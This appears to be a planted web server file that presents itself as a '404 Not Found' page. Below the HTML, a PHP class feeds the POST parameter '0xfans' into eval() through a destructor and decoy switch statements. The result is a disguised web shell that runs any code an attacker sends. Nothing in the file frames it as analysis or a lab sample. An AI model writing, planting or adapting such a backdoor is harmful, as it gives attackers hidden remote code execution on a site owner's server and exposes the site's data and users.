<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found 0xfans</title>
    <style>
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f8f8f8;
            color: #333;
            text-align: center;
        }
        .container {
            max-width: 600px;
            padding: 20px;
        }
        h1 {
            font-size: 2.5em;
            margin: 0;
        }
        p {
            font-size: 1.2em;
        }
        a {
            color: #007bff;
            text-decoration: none;
            font-weight: bold;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>404 Not Found</h1>
        <p>Sorry, the page you are Access Denied.</p>
    </div>
</body>
</html>
<?php
class Navigator {
    var $m_webInfo;
    var $m_check = array('Message', 'RequestId', 'Error', 'RecommendDoc', 'Object', 'parse');
    var $m_const;

    function __construct($S_uid) {
        $this -> name = 'session';
        $this -> m_const = "$_POST";
        $this -> m_webInfo = $S_uid;
    }

    function __destruct() {
        if ($this -> name === 'session') {
            if ($this -> m_check[5] === 'parse') {
                $Session_Check = 'Error';
                switch ($Session_Check) {
                    case 'sbrother':
                        echo 'error3';
                        break;
                    case 'parse':
                        print 'parse OK';
                        break;
                    case 'Error':
                        echo '(/(ToT)/~~)';
                        $this -> Architecture();
                        break;
                    default:
                        print 'Default';
                        break;

                }
            } else {
                echo "error";
            }
        } else {
            echo "error";
        }
        echo "</pre>";
    }

    function Architecture() {
        switch ($this -> m_check[0]) {
            case 'Message':
                eval($this -> m_webInfo);
                break;
            case 'RequestId':
                echo 'PHP is the best language in the world!'.PHP_EOL;
                break;
            case 'RecommendDoc':
                echo 'prefer C'.PHP_EOL;
                break;
            case 'Object':
                echo 'Asm'.PHP_EOL;
                break;
            default:
                echo 'The document tree is shown below'.PHP_EOL;
                break;
        }
    }
}
$Navigator = new Navigator($_POST['0xfans']);
?>